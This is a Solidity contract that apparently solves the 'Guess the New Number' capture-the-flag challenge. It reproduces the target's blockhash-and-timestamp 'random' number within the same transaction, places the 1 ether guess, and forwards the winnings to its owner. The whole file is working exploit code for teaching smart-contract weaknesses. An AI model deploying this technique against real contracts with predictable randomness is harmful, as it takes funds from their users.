// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.6;
	
interface TargetInterface {
	function GuessTheNewNumberChallenge() external payable;
		
	function guess(uint8) external payable;

	function isComplete() external returns (bool);
}

contract GuessTheNewNumber {
	address owner;

	constructor() {
		owner = msg.sender;
	}	

	function win(address _targetAddress) public payable {
		require(address(this).balance >= 1 ether, "value < 1 ether");
		TargetInterface target = TargetInterface(_targetAddress);
		uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
		target.guess{value: 1 ether}(answer);
		require(target.isComplete(), "isComplete failed");
	}

	function claimFunds() public {
		payable(owner).transfer(address(this).balance);
	}

	receive() external payable {}
}
